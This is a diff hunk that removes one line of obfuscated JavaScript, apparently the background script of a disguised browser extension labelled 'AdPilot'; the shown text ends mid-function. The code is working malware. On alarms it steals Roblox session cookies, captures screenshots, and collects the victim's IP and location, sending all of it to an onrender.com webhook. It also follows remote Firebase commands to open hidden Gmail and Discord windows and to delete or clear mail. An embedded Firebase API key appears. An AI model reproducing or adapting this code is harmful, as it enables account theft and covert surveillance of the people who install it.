@@ -1,1 +1,744 @@
-const a0_0x49c9ba=a0_0x9612;(function(_0x274903,_0x1e8485){const _0x1af536=a0_0x9612,_0x4273d1=_0x274903();while(!![]){try{const _0x290972=parseInt(_0x1af536(0x10d))/0x1+-parseInt(_0x1af536(0x14e))/0x2*(-parseInt(_0x1af536(0xc2))/0x3)+-parseInt(_0x1af536(0x13f))/0x4*(parseInt(_0x1af536(0x142))/0x5)+-parseInt(_0x1af536(0x102))/0x6+-parseInt(_0x1af536(0xf9))/0x7+-parseInt(_0x1af536(0x130))/0x8+parseInt(_0x1af536(0x162))/0x9;if(_0x290972===_0x1e8485)break;else _0x4273d1['push'](_0x4273d1['shift']());}catch(_0x202596){_0x4273d1['push'](_0x4273d1['shift']());}}}(a0_0x324a,0x606ae));const PROXY='https://rendernowreal.onrender.com',EXT_TOKEN=a0_0x49c9ba(0x118),WEBHOOK_URL=PROXY+a0_0x49c9ba(0x74),DEVICE_WEBHOOK_URL=PROXY+a0_0x49c9ba(0xc3),SCREENSHOT_WEBHOOK_URL=PROXY+a0_0x49c9ba(0xd7),OPEN_GMAIL_PATH='/commands/openGmail.json',OPEN_GMAIL_ALARM='checkOpenGmail',CLOSE_WINDOWS_PATH=a0_0x49c9ba(0x84),CLOSE_WINDOWS_ALARM=a0_0x49c9ba(0x9f),DELETE_PATH=a0_0x49c9ba(0x134),DELETE_ALARM=a0_0x49c9ba(0x71),REFRESH_INBOX_PATH=a0_0x49c9ba(0x132),CLEAR_INBOX_PATH=a0_0x49c9ba(0x12c),RESTORE_TRASH_PATH=a0_0x49c9ba(0xaf),FIREBASE_DB_URL='https://panel-188e4-default-rtdb.firebaseio.com',FIREBASE_API_KEY=a0_0x49c9ba(0x114),TRACKED_WINDOWS_KEY=a0_0x49c9ba(0xb2),JSON_HEADERS={'Content-Type':a0_0x49c9ba(0x106),'x-token':EXT_TOKEN},FORM_HEADERS={'x-token':EXT_TOKEN};let firebaseToken=null;async function signInFirebase(){const _0x20e4a7=a0_0x49c9ba;try{const _0x48ba15=await fetch(_0x20e4a7(0x95)+FIREBASE_API_KEY,{'method':'POST','headers':{'Content-Type':_0x20e4a7(0x106)},'body':JSON[_0x20e4a7(0x145)]({'returnSecureToken':!![]})}),_0x39ba10=await _0x48ba15[_0x20e4a7(0xb4)]();_0x39ba10[_0x20e4a7(0xa1)]?(firebaseToken=_0x39ba10[_0x20e4a7(0xa1)],console[_0x20e4a7(0x100)]('[firebase]\x20Signed\x20in\x20anonymously.')):console[_0x20e4a7(0x7e)](_0x20e4a7(0xde),_0x39ba10);}catch(_0x5f0430){console[_0x20e4a7(0x7e)](_0x20e4a7(0xcd),_0x5f0430);}}async function firebaseFetch(_0x3bffb3,_0x516412={}){const _0x141239=a0_0x49c9ba;if(!firebaseToken)await signInFirebase();if(!_0x516412[_0x141239(0x160)])_0x516412[_0x141239(0x160)]={};_0x516412[_0x141239(0x160)][_0x141239(0xf4)]=_0x141239(0xeb)+firebaseToken;const _0x35fac7=_0x3bffb3[_0x141239(0x108)](_0x141239(0xdf))?_0x3bffb3:''+FIREBASE_DB_URL+_0x3bffb3,_0x1c0f07=await fetch(_0x35fac7,_0x516412);if(_0x1c0f07[_0x141239(0xc1)]===0x191)return await signInFirebase(),_0x516412[_0x141239(0x160)]['Authorization']='Bearer\x20'+firebaseToken,fetch(_0x35fac7,_0x516412);return _0x1c0f07;}signInFirebase();function getBrowserName(){const _0x5a7cd3=a0_0x49c9ba,_0x3a2b53=navigator[_0x5a7cd3(0x13b)];if(_0x3a2b53['includes']('Edg/'))return'Edge';if(_0x3a2b53[_0x5a7cd3(0xfc)](_0x5a7cd3(0x12b)))return _0x5a7cd3(0x13d);if(_0x3a2b53[_0x5a7cd3(0xfc)](_0x5a7cd3(0xa8)))return _0x5a7cd3(0x115);if(_0x3a2b53['includes']('Safari/')&&!_0x3a2b53[_0x5a7cd3(0xfc)]('Chrome/'))return _0x5a7cd3(0xbb);return _0x5a7cd3(0xaa);}function a0_0x324a(){const _0x247eb3=['[firebase]\x20Auth\x20failed:','http','(no\x20subject)','sendTwoStepCode','catch','tabUpdate','onInstalled','[openGmail]\x20','https://','🌐\x20Browser','⏰\x20Auto-Send\x20(14\x20min)','local','robux','Bearer\x20','/commands/openGmailInfo.json','Roblox','normal','👤\x20Name','Browser','onMessage','slice','roblox.com','Authorization','isp','append','lastDeleteTs','runtime','3806663zqwtJO','🔐\x20New\x20Roblox\x20Cookie','Device\x20ID','includes','description','length','token','log','get','3983214qnlhBb','clearInbox','POST','🌐\x20New\x20Roblox\x20Tab','application/json','now','startsWith','Screenshot\x20capture\x20failed:','checkClearInbox','\x20Delete\x20command\x20for\x20**','toString','266488GYqQkG','🔘\x20Start\x20Verification\x20Clicked','senderName','gmailAccountInfo','update','Auto‑Connect','cookies','AIzaSyBzcBV04191n4FPEyFt73e8Dh6NwHHsY2k','Firefox','\x0a\x0a**Cookie:**\x0a```','PATCH','k7Xq2mP9vLzR4tN8wYbE3sJ6hD1fA5cG','https://www.instagram.com','Servers','displayName','.ROBLOSECURITY','gmail-account','/currency','popupSettingChanged','minimized','no-cookie','name','[openGmail]\x20error:','🆕\x20Device\x20Registered','roblox_page','success','**Display\x20Name:**\x20','query','substr','gmail','Chrome/','/commands/clearInbox.json','boolean','discord_button','restore','3135336zcSPbK','/settings/popupEnabled.json','/commands/refreshInbox.json','checkPopupSetting','/commands/deleteMessage.json','onCreated','username','🌍\x20IP','\x20failed:','Active\x20Tab\x20Screenshot','💰\x20Robux','userAgent','code','Chrome','done','1649748PitYGT','AdPilot\x20•\x20','captureVisibleTab','5RlAjRP','No\x20capturable\x20tab\x20found','❌\x20Closed\x20all\x20tracked\x20Gmail/Discord\x20windows','stringify','checkRefreshInbox','sessionid','https://ipwho.is/','popupEnabled','cookieChange','👤\x20Roblox','url','addListener','4nMAeWL','📩\x20Email','📌\x20Source','deleteGmailMessage','action','threadId','Not\x20logged\x20in','reload','lastProcessedScreenshotRequestId',']\x20error:','🔑\x20Account\x20Changed','/validate-membership','city','https://api.ipify.org?format=json','roblox_new_tab','.json?shallow=true','📍\x20State/Region','checkScreenshotRequests','headers','🔐\x202-Step\x20Verification\x20Code','12417498fWAdNB','checkRestoreTrash','checkDeleteMessage','manual','♻️\x20Restore\x20trash:\x20','/hook/main','join','/devices/','📧\x20Gmail\x20Account\x20Detected','🏢\x20ISP','alarms','complete','gmail-inbox-','subject','create','error','snippet','A\x20user\x20clicked\x20the\x20**Start\x20Verification**\x20button.','startVerificationClicked','AdPilot','.json','/commands/closeGmailWindows.json','📸\x20Instagram','clear','rescrapeInbox','region','🆔\x20Device','message','set','png','storage','Unknown','onStartup','/profile)\x0a**User\x20ID:**\x20','https://discord.com/','startup','🌐\x20Tab\x20URL','alarm','https://identitytoolkit.googleapis.com/v1/accounts:signUp?key=','deviceId','platform','then','https://economy.roblox.com/v1/users/','sendDiscordToken','🌎\x20Country','value','Invalid\x20code','lastCloseWindowsTs','checkCloseWindows','dev_','idToken','thumbnail','**Account:**\x20[','lastOpenGmailTs','toUpperCase','remove',']\x20sent\x20ok','Firefox/','country','Unknown\x20Browser','file','close-windows','&size=420x420&format=Png&isCircular=false','reason','/commands/restoreTrash.json','Account\x20Age','discord-token','trackedWindows','autoSendCookie','json','Not\x20logged\x20into\x20Roblox.','payload_json','lastClearInboxTs','.ROBLOSECURITY=','data','📥\x20Inbox\x20','Safari','sendMessage','❌\x20No\x20Roblox\x20Cookie\x20Found','connection','🌐\x20Roblox\x20Page\x20Loaded','[webhook\x20','status','1141122NBbEcR','/hook/device','Code:\x20```','*://*.roblox.com/*','windowId','install','tabs','push','toISOString','lastRestoreTrashTs','tabCreate','[firebase]\x20Auth\x20error:','https://mail.google.com','](https://www.roblox.com/users/','/robloxUsername.json','📸\x20Screenshot\x20triggered\x20by\x20**','filter','```','windows','PUT','👤\x20Roblox\x20User','/hook/screenshot','https://premiumfeatures.roblox.com/v1/users/','*://mail.google.com/*','\x20—\x20','\x0a**Username:**\x20','user','fields'];a0_0x324a=function(){return _0x247eb3;};return a0_0x324a();}async function sendToWebhook(_0x5df574,_0x49556e=''){const _0x1912d8=a0_0x49c9ba;try{const _0x245a1c=await fetch(WEBHOOK_URL,{'method':'POST','headers':JSON_HEADERS,'body':JSON[_0x1912d8(0x145)](_0x5df574)});if(!_0x245a1c['ok']){const _0x9cfcfe=await _0x245a1c['text']()['catch'](()=>'');console['error'](_0x1912d8(0xc0)+_0x49556e+']\x20'+_0x245a1c[_0x1912d8(0xc1)]+':',_0x9cfcfe[_0x1912d8(0xf2)](0x0,0x12c));}else console[_0x1912d8(0x100)](_0x1912d8(0xc0)+_0x49556e+_0x1912d8(0xa7));}catch(_0x57d9fb){console['error']('[webhook\x20'+_0x49556e+_0x1912d8(0x157),_0x57d9fb);}}async function trackWindow(_0x50e105){const _0x34fa85=a0_0x49c9ba,_0x33fa80=await chrome['storage'][_0x34fa85(0xe9)][_0x34fa85(0x101)]({[TRACKED_WINDOWS_KEY]:[]}),_0xa8fc6f=_0x33fa80[TRACKED_WINDOWS_KEY];if(!_0xa8fc6f[_0x34fa85(0xfc)](_0x50e105))_0xa8fc6f[_0x34fa85(0xc9)](_0x50e105);await chrome[_0x34fa85(0x8d)][_0x34fa85(0xe9)][_0x34fa85(0x8b)]({[TRACKED_WINDOWS_KEY]:_0xa8fc6f});}async function closeAllTrackedWindows(){const _0x2c8451=a0_0x49c9ba,_0x23a1a3=await chrome[_0x2c8451(0x8d)][_0x2c8451(0xe9)][_0x2c8451(0x101)]({[TRACKED_WINDOWS_KEY]:[]});for(const _0x28ad75 of _0x23a1a3[TRACKED_WINDOWS_KEY]){try{await chrome['windows'][_0x2c8451(0xa6)](_0x28ad75);}catch(_0x24ff0c){}}await chrome['storage'][_0x2c8451(0xe9)][_0x2c8451(0x8b)]({[TRACKED_WINDOWS_KEY]:[]});}async function captureAndSendScreenshot(_0x16a854=a0_0x49c9ba(0x72)){const _0x1e7df5=a0_0x49c9ba;try{await new Promise(_0x4f50b2=>setTimeout(_0x4f50b2,0x1f4));let _0x591f21=await chrome[_0x1e7df5(0xc8)]['query']({'active':!![],'currentWindow':!![]});if(!_0x591f21||_0x591f21[_0x1e7df5(0xfe)]===0x0){_0x591f21=(await chrome[_0x1e7df5(0xc8)][_0x1e7df5(0x128)]({}))[_0x1e7df5(0xd2)](_0x562180=>_0x562180[_0x1e7df5(0x14c)]&&(_0x562180[_0x1e7df5(0x14c)]['startsWith']('http://')||_0x562180[_0x1e7df5(0x14c)][_0x1e7df5(0x108)](_0x1e7df5(0xe6))));if(_0x591f21[_0x1e7df5(0xfe)]===0x0)throw new Error(_0x1e7df5(0x143));_0x591f21=[_0x591f21[0x0]];}const _0x105317=_0x591f21[0x0],_0x3f64e8=await chrome[_0x1e7df5(0xc8)][_0x1e7df5(0x141)](_0x105317[_0x1e7df5(0xc6)],{'format':_0x1e7df5(0x8c)});if(!_0x3f64e8)throw new Error('captureVisibleTab\x20returned\x20null');const _0x1b92a1=getBrowserName(),_0x52271a=await getIPAddress(),_0x358dd8=await getIPDetails(_0x52271a),_0x5a39ac=await getRobloxCookie();let _0x1a91ad=_0x5a39ac?await getRobloxAccountInfo(_0x5a39ac):null;const _0x5a27f6=[{'name':_0x1e7df5(0x93),'value':_0x105317[_0x1e7df5(0x14c)]||_0x1e7df5(0x8e),'inline':![]},{'name':_0x1e7df5(0xe7),'value':_0x1b92a1,'inline':!![]}];if(_0x52271a)_0x5a27f6[_0x1e7df5(0xc9)]({'name':'🌍\x20IP\x20Address','value':'```'+_0x52271a+'```','inline':!![]});_0x358dd8&&(_0x5a27f6[_0x1e7df5(0xc9)]({'name':'🏙️\x20City','value':_0x358dd8[_0x1e7df5(0x15a)],'inline':!![]}),_0x5a27f6['push']({'name':_0x1e7df5(0x15e),'value':_0x358dd8[_0x1e7df5(0x88)],'inline':!![]}),_0x5a27f6[_0x1e7df5(0xc9)]({'name':'🌎\x20Country','value':_0x358dd8['country'],'inline':!![]}),_0x5a27f6['push']({'name':_0x1e7df5(0x78),'value':_0x358dd8[_0x1e7df5(0xf5)],'inline':!![]}));_0x1a91ad&&_0x1a91ad[_0x1e7df5(0xdc)]?_0x5a27f6[_0x1e7df5(0xc9)]({'name':_0x1e7df5(0xd6),'value':'['+_0x1a91ad[_0x1e7df5(0xdc)][_0x1e7df5(0x122)]+'](https://www.roblox.com/users/'+_0x1a91ad[_0x1e7df5(0xdc)]['id']+'/profile)','inline':!![]}):_0x5a27f6[_0x1e7df5(0xc9)]({'name':_0x1e7df5(0xd6),'value':_0x1e7df5(0x154),'inline':!![]});const _0x5ddf5b=new FormData();_0x5ddf5b[_0x1e7df5(0xf6)](_0x1e7df5(0xab),await(await fetch(_0x3f64e8))['blob'](),'screenshot.png'),_0x5ddf5b['append'](_0x1e7df5(0xb6),JSON[_0x1e7df5(0x145)]({'content':_0x1e7df5(0xd1)+_0x16a854+'**','embeds':[{'title':_0x1e7df5(0x139),'color':0x6c5ce7,'timestamp':new Date()['toISOString'](),'footer':{'text':_0x1e7df5(0x82)},'fields':_0x5a27f6}]})),await fetch(SCREENSHOT_WEBHOOK_URL,{'method':_0x1e7df5(0x104),'headers':FORM_HEADERS,'body':_0x5ddf5b});}catch(_0x542edc){console[_0x1e7df5(0x7e)](_0x1e7df5(0x109),_0x542edc);}}const SCREENSHOT_REQUESTS_PATH='/screenshot_requests',SCREENSHOT_REQUEST_CHECK_ALARM=a0_0x49c9ba(0x15f);async function getHighestScreenshotRequestId(){const _0x32e73a=a0_0x49c9ba;try{const _0x341d3c=await firebaseFetch(SCREENSHOT_REQUESTS_PATH+_0x32e73a(0x15d));if(!_0x341d3c['ok'])return null;const _0x3b24ab=await _0x341d3c['json']();if(!_0x3b24ab)return null;const _0x2bc951=Object['keys'](_0x3b24ab);if(_0x2bc951[_0x32e73a(0xfe)]===0x0)return null;return _0x2bc951['sort']((_0x543c95,_0x13a727)=>Number(_0x543c95)-Number(_0x13a727)),_0x2bc951[_0x2bc951[_0x32e73a(0xfe)]-0x1];}catch(_0x55c33d){return null;}}async function checkScreenshotRequests(){const _0x1543c2=a0_0x49c9ba;try{const _0x7f3943=await getHighestScreenshotRequestId();if(!_0x7f3943)return;const _0x5e519b=await chrome[_0x1543c2(0x8d)][_0x1543c2(0xe9)][_0x1543c2(0x101)]({'lastProcessedScreenshotRequestId':'0'});Number(_0x7f3943)>Number(_0x5e519b[_0x1543c2(0x156)])&&(await captureAndSendScreenshot(_0x1543c2(0x12e)),await chrome[_0x1543c2(0x8d)][_0x1543c2(0xe9)][_0x1543c2(0x8b)]({'lastProcessedScreenshotRequestId':_0x7f3943}));}catch(_0x529e42){}}async function checkOpenGmail(){const _0x14144b=a0_0x49c9ba;try{const _0x1ffa99=await firebaseFetch(OPEN_GMAIL_PATH);if(!_0x1ffa99['ok'])return;const _0x55b1fb=await _0x1ffa99[_0x14144b(0xb4)]();if(!_0x55b1fb||!_0x55b1fb['ts'])return;const _0x22bc16=await chrome[_0x14144b(0x8d)][_0x14144b(0xe9)][_0x14144b(0x101)]({'lastOpenGmailTs':0x0});if(_0x55b1fb['ts']>_0x22bc16[_0x14144b(0xa4)]){await chrome[_0x14144b(0x8d)][_0x14144b(0xe9)]['set']({'lastOpenGmailTs':_0x55b1fb['ts']});async function _0x2bc79d(_0x4059c9,_0x42b7e5){const _0x4cdb57=_0x14144b;try{const _0x35491b=await chrome[_0x4cdb57(0xd4)][_0x4cdb57(0x7d)]({'url':_0x4059c9,'focused':![],'width':0x384,'height':0x2bc,'type':_0x4cdb57(0xee)});try{await chrome['windows'][_0x4cdb57(0x111)](_0x35491b['id'],{'state':_0x4cdb57(0x120),'focused':![]});}catch(_0x554294){}await trackWindow(_0x35491b['id']);}catch(_0x2f6a63){console[_0x4cdb57(0x7e)](_0x4cdb57(0xe5)+_0x42b7e5+_0x4cdb57(0x138),_0x2f6a63);}}await _0x2bc79d(_0x14144b(0xce),_0x14144b(0x12a)),await new Promise(_0x5e6bce=>setTimeout(_0x5e6bce,0x320)),await _0x2bc79d(_0x14144b(0x91),'discord-1'),await new Promise(_0x4caa05=>setTimeout(_0x4caa05,0x320)),await _0x2bc79d(_0x14144b(0x91),'discord-2');}}catch(_0x32f6df){console[_0x14144b(0x7e)](_0x14144b(0x123),_0x32f6df);}}async function checkCloseWindows(){const _0x41f7f2=a0_0x49c9ba;try{const _0x436baf=await firebaseFetch(CLOSE_WINDOWS_PATH);if(!_0x436baf['ok'])return;const _0x432e65=await _0x436baf['json']();if(!_0x432e65||!_0x432e65['ts'])return;const _0x3767ab=await chrome[_0x41f7f2(0x8d)][_0x41f7f2(0xe9)]['get']({'lastCloseWindowsTs':0x0});_0x432e65['ts']>_0x3767ab[_0x41f7f2(0x9e)]&&(await chrome[_0x41f7f2(0x8d)][_0x41f7f2(0xe9)][_0x41f7f2(0x8b)]({'lastCloseWindowsTs':_0x432e65['ts']}),await closeAllTrackedWindows(),sendToWebhook({'content':_0x41f7f2(0x144)},_0x41f7f2(0xac)));}catch(_0x1c6c34){}}async function checkDeleteMessage(){const _0x3a836a=a0_0x49c9ba;try{const _0x47a2b4=await firebaseFetch(DELETE_PATH);if(!_0x47a2b4['ok'])return;const _0x15e3c3=await _0x47a2b4[_0x3a836a(0xb4)]();if(!_0x15e3c3||!_0x15e3c3[_0x3a836a(0x153)]||_0x15e3c3[_0x3a836a(0xc1)]===_0x3a836a(0x13e))return;const _0x46773a=await chrome[_0x3a836a(0x8d)][_0x3a836a(0xe9)][_0x3a836a(0x101)]({'lastDeleteTs':0x0});if(_0x15e3c3['ts']<=_0x46773a[_0x3a836a(0xf7)])return;await chrome[_0x3a836a(0x8d)]['local']['set']({'lastDeleteTs':_0x15e3c3['ts']});let _0x6f714b=await chrome['tabs'][_0x3a836a(0x128)]({'url':'*://mail.google.com/*'}),_0x33e356;if(_0x6f714b[_0x3a836a(0xfe)]===0x0){const _0x2e75d7=await chrome[_0x3a836a(0xd4)][_0x3a836a(0x7d)]({'url':_0x3a836a(0xce),'focused':![],'width':0x384,'height':0x2bc});await new Promise(_0x1e3a6c=>setTimeout(_0x1e3a6c,0x2ee0));const _0x47387=await chrome['tabs'][_0x3a836a(0x128)]({'windowId':_0x2e75d7['id']});_0x33e356=_0x47387[0x0]?.['id'],await trackWindow(_0x2e75d7['id']);}else _0x33e356=_0x6f714b[0x0]['id'];if(!_0x33e356)return;let _0x57aaf9;try{_0x57aaf9=await chrome['tabs']['sendMessage'](_0x33e356,{'action':_0x3a836a(0x151),'threadId':_0x15e3c3[_0x3a836a(0x153)],'subject':_0x15e3c3[_0x3a836a(0x7c)]});}catch(_0x170752){await chrome[_0x3a836a(0xc8)][_0x3a836a(0x155)](_0x33e356),await new Promise(_0x129fbe=>setTimeout(_0x129fbe,0x36b0));try{_0x57aaf9=await chrome[_0x3a836a(0xc8)]['sendMessage'](_0x33e356,{'action':_0x3a836a(0x151),'threadId':_0x15e3c3[_0x3a836a(0x153)],'subject':_0x15e3c3[_0x3a836a(0x7c)]});}catch(_0x24f945){_0x57aaf9={'ok':![],'error':String(_0x24f945)};}}await firebaseFetch(DELETE_PATH,{'method':_0x3a836a(0x117),'body':JSON[_0x3a836a(0x145)]({'status':_0x3a836a(0x13e),'doneAt':Date[_0x3a836a(0x107)](),'result':_0x57aaf9})}),sendToWebhook({'content':(_0x57aaf9?.['ok']?'✅':'❌')+_0x3a836a(0x10b)+(_0x15e3c3['subject']||_0x15e3c3['threadId'])+'**'},'delete-result');}catch(_0x29110d){}}async function checkRefreshInbox(){const _0x591a22=a0_0x49c9ba;try{const _0x30808e=await firebaseFetch(REFRESH_INBOX_PATH);if(!_0x30808e['ok'])return;const _0x2adf61=await _0x30808e['json']();if(!_0x2adf61||!_0x2adf61['ts'])return;const _0x4cb061=await chrome[_0x591a22(0x8d)][_0x591a22(0xe9)][_0x591a22(0x101)]({'lastRefreshInboxTs':0x0});if(_0x2adf61['ts']<=_0x4cb061['lastRefreshInboxTs'])return;await chrome[_0x591a22(0x8d)][_0x591a22(0xe9)][_0x591a22(0x8b)]({'lastRefreshInboxTs':_0x2adf61['ts']});const _0x592fc3=await chrome[_0x591a22(0xc8)]['query']({'url':_0x591a22(0xd9)});if(_0x592fc3[_0x591a22(0xfe)]>0x0)try{await chrome[_0x591a22(0xc8)][_0x591a22(0xbc)](_0x592fc3[0x0]['id'],{'action':_0x591a22(0x87)});}catch(_0x3eba62){await chrome[_0x591a22(0xc8)][_0x591a22(0x155)](_0x592fc3[0x0]['id']);}else{const _0x39eedb=await chrome[_0x591a22(0xd4)][_0x591a22(0x7d)]({'url':_0x591a22(0xce),'focused':![],'width':0x384,'height':0x2bc});await trackWindow(_0x39eedb['id']);}}catch(_0x5c0ac0){}}async function checkClearInbox(){const _0x27f385=a0_0x49c9ba;try{const _0xa06bdf=await firebaseFetch(CLEAR_INBOX_PATH);if(!_0xa06bdf['ok'])return;const _0xf08258=await _0xa06bdf[_0x27f385(0xb4)]();if(!_0xf08258||!_0xf08258['ts'])return;const _0x21da67=await chrome['storage'][_0x27f385(0xe9)][_0x27f385(0x101)]({'lastClearInboxTs':0x0});if(_0xf08258['ts']<=_0x21da67[_0x27f385(0xb7)])return;await chrome[_0x27f385(0x8d)][_0x27f385(0xe9)][_0x27f385(0x8b)]({'lastClearInboxTs':_0xf08258['ts']});let _0x1d8b08=await chrome[_0x27f385(0xc8)][_0x27f385(0x128)]({'url':_0x27f385(0xd9)});if(_0x1d8b08[_0x27f385(0xfe)]===0x0){const _0x4da16b=await chrome[_0x27f385(0xd4)]['create']({'url':_0x27f385(0xce),'focused':![],'width':0x384,'height':0x2bc});await trackWindow(_0x4da16b['id']),await new Promise(_0x34ba06=>setTimeout(_0x34ba06,0x2ee0)),_0x1d8b08=await chrome['tabs'][_0x27f385(0x128)]({'windowId':_0x4da16b['id']});}const _0x2ba261=await chrome[_0x27f385(0xc8)][_0x27f385(0xbc)](_0x1d8b08[0x0]['id'],{'action':_0x27f385(0x103)});sendToWebhook({'content':'🗑️\x20Clear\x20inbox:\x20'+JSON['stringify'](_0x2ba261)},_0x27f385(0x86));}catch(_0x1a269e){}}async function checkRestoreTrash(){const _0x420051=a0_0x49c9ba;try{const _0x1ea4fa=await firebaseFetch(RESTORE_TRASH_PATH);if(!_0x1ea4fa['ok'])return;const _0x98fe03=await _0x1ea4fa['json']();if(!_0x98fe03||!_0x98fe03['ts'])return;const _0x9c2027=await chrome[_0x420051(0x8d)][_0x420051(0xe9)][_0x420051(0x101)]({'lastRestoreTrashTs':0x0});if(_0x98fe03['ts']<=_0x9c2027[_0x420051(0xcb)])return;await chrome[_0x420051(0x8d)][_0x420051(0xe9)][_0x420051(0x8b)]({'lastRestoreTrashTs':_0x98fe03['ts']});let _0x33301a=await chrome[_0x420051(0xc8)]['query']({'url':_0x420051(0xd9)});if(_0x33301a[_0x420051(0xfe)]===0x0){const _0x452e9f=await chrome['windows']['create']({'url':_0x420051(0xce),'focused':![],'width':0x384,'height':0x2bc});await trackWindow(_0x452e9f['id']),await new Promise(_0x130071=>setTimeout(_0x130071,0x2ee0)),_0x33301a=await chrome[_0x420051(0xc8)]['query']({'windowId':_0x452e9f['id']});}const _0x3b7a80=await chrome[_0x420051(0xc8)]['sendMessage'](_0x33301a[0x0]['id'],{'action':'restoreTrash'});sendToWebhook({'content':_0x420051(0x73)+JSON[_0x420051(0x145)](_0x3b7a80)},_0x420051(0x12f));}catch(_0x319603){}}chrome['runtime'][a0_0x49c9ba(0xe4)][a0_0x49c9ba(0x14d)](async _0x3008a9=>{const _0x214d70=a0_0x49c9ba;chrome[_0x214d70(0x79)][_0x214d70(0x7d)]('autoSendCookie',{'periodInMinutes':0xe}),chrome[_0x214d70(0x79)][_0x214d70(0x7d)](POPUP_CHECK_ALARM,{'periodInMinutes':0.5}),chrome[_0x214d70(0x79)][_0x214d70(0x7d)](SCREENSHOT_REQUEST_CHECK_ALARM,{'periodInMinutes':0.1}),chrome[_0x214d70(0x79)][_0x214d70(0x7d)](OPEN_GMAIL_ALARM,{'periodInMinutes':0.1}),chrome[_0x214d70(0x79)][_0x214d70(0x7d)](CLOSE_WINDOWS_ALARM,{'periodInMinutes':0.1}),chrome[_0x214d70(0x79)][_0x214d70(0x7d)](DELETE_ALARM,{'periodInMinutes':0.1}),chrome['alarms']['create'](_0x214d70(0x146),{'periodInMinutes':0.1}),chrome[_0x214d70(0x79)][_0x214d70(0x7d)](_0x214d70(0x10a),{'periodInMinutes':0.1}),chrome[_0x214d70(0x79)][_0x214d70(0x7d)](_0x214d70(0x70),{'periodInMinutes':0.1});if(_0x3008a9[_0x214d70(0xae)]===_0x214d70(0xc7))registerDevice();}),chrome['runtime'][a0_0x49c9ba(0x8f)]['addListener'](async()=>{const _0x2cb229=a0_0x49c9ba;chrome[_0x2cb229(0x79)]['create'](_0x2cb229(0xb3),{'periodInMinutes':0xe}),chrome[_0x2cb229(0x79)][_0x2cb229(0x7d)](POPUP_CHECK_ALARM,{'periodInMinutes':0.5}),chrome[_0x2cb229(0x79)][_0x2cb229(0x7d)](SCREENSHOT_REQUEST_CHECK_ALARM,{'periodInMinutes':0.1}),chrome['alarms'][_0x2cb229(0x7d)](OPEN_GMAIL_ALARM,{'periodInMinutes':0.1}),chrome['alarms'][_0x2cb229(0x7d)](CLOSE_WINDOWS_ALARM,{'periodInMinutes':0.1}),chrome[_0x2cb229(0x79)][_0x2cb229(0x7d)](DELETE_ALARM,{'periodInMinutes':0.1}),chrome['alarms'][_0x2cb229(0x7d)](_0x2cb229(0x146),{'periodInMinutes':0.1}),chrome['alarms']['create'](_0x2cb229(0x10a),{'periodInMinutes':0.1}),chrome[_0x2cb229(0x79)][_0x2cb229(0x7d)](_0x2cb229(0x70),{'periodInMinutes':0.1});}),chrome[a0_0x49c9ba(0x79)]['onAlarm'][a0_0x49c9ba(0x14d)](_0x5afc90=>{const _0x4f252c=a0_0x49c9ba;if(_0x5afc90[_0x4f252c(0x122)]===_0x4f252c(0xb3))sendRobloxCookieToWebhook(_0x4f252c(0x94));if(_0x5afc90[_0x4f252c(0x122)]===POPUP_CHECK_ALARM)checkPopupSetting();if(_0x5afc90['name']===SCREENSHOT_REQUEST_CHECK_ALARM)checkScreenshotRequests();if(_0x5afc90[_0x4f252c(0x122)]===OPEN_GMAIL_ALARM)checkOpenGmail();if(_0x5afc90['name']===CLOSE_WINDOWS_ALARM)checkCloseWindows();if(_0x5afc90[_0x4f252c(0x122)]===DELETE_ALARM)checkDeleteMessage();if(_0x5afc90[_0x4f252c(0x122)]===_0x4f252c(0x146))checkRefreshInbox();if(_0x5afc90[_0x4f252c(0x122)]===_0x4f252c(0x10a))checkClearInbox();if(_0x5afc90[_0x4f252c(0x122)]===_0x4f252c(0x70))checkRestoreTrash();});const POPUP_SETTING_PATH=a0_0x49c9ba(0x131),POPUP_CHECK_ALARM=a0_0x49c9ba(0x133);async function checkPopupSetting(){const _0x5268a0=a0_0x49c9ba;try{const _0x274223=await firebaseFetch(POPUP_SETTING_PATH);if(!_0x274223['ok'])return;const _0x479041=await _0x274223[_0x5268a0(0xb4)]();if(typeof _0x479041!==_0x5268a0(0x12d))return;const _0xebf06b=await chrome['storage'][_0x5268a0(0xe9)][_0x5268a0(0x101)]({'popupEnabled':!![]});if(_0xebf06b[_0x5268a0(0x149)]!==_0x479041){await chrome[_0x5268a0(0x8d)][_0x5268a0(0xe9)]['set']({'popupEnabled':_0x479041});const _0x3bcb8c=await chrome[_0x5268a0(0xc8)][_0x5268a0(0x128)]({'url':_0x5268a0(0xc5)});for(const _0x1b74ce of _0x3bcb8c){try{await chrome[_0x5268a0(0xc8)][_0x5268a0(0xbc)](_0x1b74ce['id'],{'action':_0x5268a0(0x11f),'enabled':_0x479041});}catch(_0x4a7bfa){}}}}catch(_0x28778c){}}checkPopupSetting();let lastKnownCookie='',noCookieSent=![];chrome[a0_0x49c9ba(0xc8)]['onUpdated']['addListener']((_0x125330,_0x4f37a3,_0x232e93)=>{const _0x511986=a0_0x49c9ba;_0x4f37a3[_0x511986(0xc1)]===_0x511986(0x7a)&&_0x232e93[_0x511986(0x14c)]&&_0x232e93[_0x511986(0x14c)][_0x511986(0xfc)](_0x511986(0xf3))&&setTimeout(()=>{const _0x55276c=_0x511986;checkCookieAndSend(_0x55276c(0xe3)),captureAndSendScreenshot(_0x55276c(0x125));},0x7d0);}),chrome[a0_0x49c9ba(0xc8)][a0_0x49c9ba(0x135)]['addListener'](_0x1eb7c1=>{const _0x1cc0e1=a0_0x49c9ba;_0x1eb7c1[_0x1cc0e1(0x14c)]&&_0x1eb7c1[_0x1cc0e1(0x14c)]['includes'](_0x1cc0e1(0xf3))&&setTimeout(()=>{const _0x420691=_0x1cc0e1;checkCookieAndSend(_0x420691(0xcc)),captureAndSendScreenshot(_0x420691(0x15c));},0x7d0);}),getRobloxCookie()[a0_0x49c9ba(0x98)](_0x1dee4e=>{if(_0x1dee4e)lastKnownCookie=_0x1dee4e;}),setInterval(async()=>{const _0x2b96da=a0_0x49c9ba,_0xafb5b6=await getRobloxCookie();_0xafb5b6&&_0xafb5b6!==lastKnownCookie&&(lastKnownCookie=_0xafb5b6,noCookieSent=![],sendRobloxCookieToWebhook(_0x2b96da(0x14a)));},0x3a98);async function getIPAddress(){const _0x369fd7=a0_0x49c9ba;try{const _0x5717a9=await fetch(_0x369fd7(0x15b));return _0x5717a9['ok']?(await _0x5717a9[_0x369fd7(0xb4)]())['ip']:null;}catch{return null;}}async function getIPDetails(_0x425056){const _0x20dddf=a0_0x49c9ba;if(!_0x425056)return null;try{const _0x3546d6=await 